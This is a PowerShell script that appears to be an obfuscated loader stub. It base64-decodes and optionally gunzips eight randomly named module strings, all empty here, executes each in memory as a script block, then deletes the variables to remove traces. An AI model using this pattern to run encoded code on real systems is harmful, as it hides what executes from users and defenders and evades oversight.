#Requires -Version 2

$Emaciating = ""
$Disgruntle = ""
$Structures = ""
$Infectious = ""
$Interfaith = ""
$Stentorian = ""
$Protectors = ""
$Emanations = ""

$Modules = @($Emaciating,$Disgruntle,$Structures,$Infectious,$Interfaith,$Stentorian,$Protectors,$Emanations)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
    Remove-Variable -Name "Decoded"
    Remove-Variable -Name "ScriptBlock"
}
Remove-Variable -Name "Modules"
@("Emaciating","Disgruntle","Structures","Infectious","Interfaith","Stentorian","Protectors","Emanations") | ForEach-Object { Remove-Variable -Name $_ }
